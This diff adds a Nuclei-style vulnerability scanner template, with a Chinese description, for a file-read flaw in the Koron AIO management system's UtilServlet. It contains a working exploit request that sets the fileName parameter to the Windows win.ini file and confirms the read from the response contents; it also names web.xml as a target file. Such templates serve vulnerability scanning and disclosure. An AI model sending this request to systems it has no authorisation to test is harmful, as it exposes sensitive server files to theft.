@@ -1,0 +1,33 @@
+id: CVD-2023-1304
+
+info:
+  name: 科荣 AIO 管理系统 UtilServlet 文件 fileName 参数文件读取漏洞
+  author: SleepingBag945
+  severity: high
+  description: |
+    科荣AIO管理系统是一款十分优秀的企业管理工具。
+    科荣AIO管理系统 UtilServlet 文件读取漏洞，攻击者可利用该漏洞获取系统的敏感信息等。
+    ../../website/WEB-INF/web.xml
+  tags: koronsoft
+
+http:
+  - raw:
+      - |
+        POST /UtilServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        operation=readErrorExcel&fileName=C:\\windows/win.ini
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        part: body
+        condition: and
